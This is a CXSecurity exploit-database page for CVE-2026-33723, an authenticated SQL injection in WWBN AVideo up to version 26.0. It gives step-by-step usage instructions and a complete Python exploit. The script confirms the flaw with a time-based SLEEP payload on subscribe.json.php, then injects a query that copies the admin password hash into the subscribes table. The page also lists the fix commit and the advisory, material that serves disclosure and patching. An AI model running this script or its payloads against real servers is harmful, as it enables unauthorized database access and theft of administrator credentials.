---
title: WWBN AVideo < = 26.0 - Authenticated SQL Injection
url: https://cxsecurity.com/issue/WLB-2026030031
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-26
fetch_date: 2026-03-27T04:26:45.223393
---

# WWBN AVideo < = 26.0 - Authenticated SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WWBN AVideo <= 26.0 - Authenticated SQL Injection** **2026.03.26**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-33723](https://cxsecurity.com/cveshow/CVE-2026-33723/ "Click to see CVE-2026-33723")**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

Exploit Title: WWBN AVideo <= 26.0 - Authenticated SQL Injection
CVE: CVE-2026-33723
Date: 2026-03-25
Exploit Author: Mohammed Idrees Banyamer
Author Country: Jordan
Instagram: @banyamer\_security
Author GitHub: https://github.com/mbanyamer
Author Blog: https://banyamersecurity.com/blog/
Vendor Homepage: https://github.com/WWBN/AVideo
Software Link: https://github.com/WWBN/AVideo
Affected: AVideo <= 26.0
Tested on: AVideo 26.0
Category: Web Application
Platform: Linux / Windows
Exploit Type: SQL Injection
CVSS: 7.1 HIGH
Description: Authenticated SQL Injection via user\_id parameter in subscribe.json.php and subscribeNotify.json.php allowing extraction of admin password hashes and sensitive database data.
Fixed in: https://github.com/WWBN/AVideo/commit/36dfae22059fbd66fd34bbc5568a838fc0efd66c
Notes:
• Requires valid PHPSESSID from any logged-in user (regular user is enough)
• Injects data into the subscribes.email column
How to Use
Step 1:
Login to AVideo with any user account and copy the PHPSESSID cookie value
Step 2:
Edit TARGET and PHPSESSID variables in the exploit script, then run it
=== Full Python Exploit ===
#!/usr/bin/env python3
# Exploit Title: WWBN AVideo <= 26.0 - Authenticated SQL Injection
# CVE: CVE-2026-33723
# Date: 2026-03-25
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub: https://github.com/mbanyamer
# Author Blog : https://banyamersecurity.com/blog/
# Vendor Homepage: https://github.com/WWBN/AVideo
# Software Link: https://github.com/WWBN/AVideo
# Affected: AVideo <= 26.0
# Tested on: AVideo 26.0
# Category: Web Application
# Platform: Linux / Windows
# Exploit Type: SQL Injection
# CVSS: 7.1
# Description: Authenticated SQL Injection via user\_id parameter in subscribe.json.php and subscribeNotify.json.php allowing extraction of admin password hashes and sensitive database data.
# Fixed in: https://github.com/WWBN/AVideo/commit/36dfae22059fbd66fd34bbc5568a838fc0efd66c
# Usage:
# python3 exploit.py
def banner():
print(r"""
╔██████╗ █████╗ ███╗ ██╗██╗ ██╗ █████╗ ███╗ ███╗███████╗██████╗╗
║██╔══██╗██╔══██╗████╗ ██║╚██╗ ██╔╝██╔══██╗████╗ ████║██╔════╝██╔══██║
║██████╔╝███████║██╔██╗ ██║ ╚████╔╝ ███████║██╔████╔██║█████╗ ███████╔╝
║██╔══██╗██╔══██║██║╚██╗██║ ╚██╔╝ ██╔══██║██║╚██╔╝██║██╔══╝ ██╔══██╗
║██████╔╝██║ ██║██║ ╚████║ ██║ ██║ ██║██║ ╚═╝ ██║███████╗██║ ██║
╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═══╝ ╚═╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝
╔═╗ Banyamer Security ╔═╗
""")
import requests
import sys
import time
TARGET = "https://target.com"
PHPSESSID = "YOUR\_VALID\_PHPSESSID\_HERE"
HEADERS = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
"Content-Type": "application/x-www-form-urlencoded",
}
COOKIES = {"PHPSESSID": PHPSESSID}
def send\_payload(payload, endpoint="/objects/subscribe.json.php"):
data = {"user\_id": payload}
url = TARGET.rstrip("/") + endpoint
try:
r = requests.post(url, data=data, cookies=COOKIES, headers=HEADERS, timeout=15)
return r
except Exception as e:
print(f"[-] Error: {e}")
return None
def main():
banner()
if not PHPSESSID or PHPSESSID == "YOUR\_VALID\_PHPSESSID\_HERE":
print("[-] Please edit the script and set your valid PHPSESSID!")
sys.exit(1)
print(f"[\*] Target : {TARGET}")
print(f"[\*] Session : {PHPSESSID[:15]}...\n")
print("[+] Testing Time-Based SQL Injection...")
start = time.time()
send\_payload("99999'+AND+SLEEP(5)+AND+'1")
elapsed = time.time() - start
print(f" Response time: {elapsed:.2f} seconds")
if elapsed >= 4.5:
print(" [+] Vulnerable! Time-based SQLi confirmed.")
else:
print(" [-] Not vulnerable or blocked.")
print("\n" + "="\*70)
print("[+] Extracting Admin Password Hash...")
extract\_payload = "99999',(SELECT pass FROM users WHERE isAdmin=1 LIMIT 1),'a','1.1.1.1',now(),now(),'1'); -- -"
send\_payload(extract\_payload)
print(" [+] Payload sent successfully!")
print(" [+] Admin password hash has been injected into the 'subscribes' table (email column).")
print(" [+] Check your subscriptions or database to retrieve the hash.")
print("\n[+] Exploit finished. Use responsibly!")
if \_\_name\_\_ == "\_\_main\_\_":
main()

**##### References:**

https://github.com/WWBN/AVideo/security/advisories/GHSA-ffr8-fxhv-fv8h

https://github.com/WWBN/AVideo/commit/36dfae22059fbd66fd34bbc5568a838fc0efd66c

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030031)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top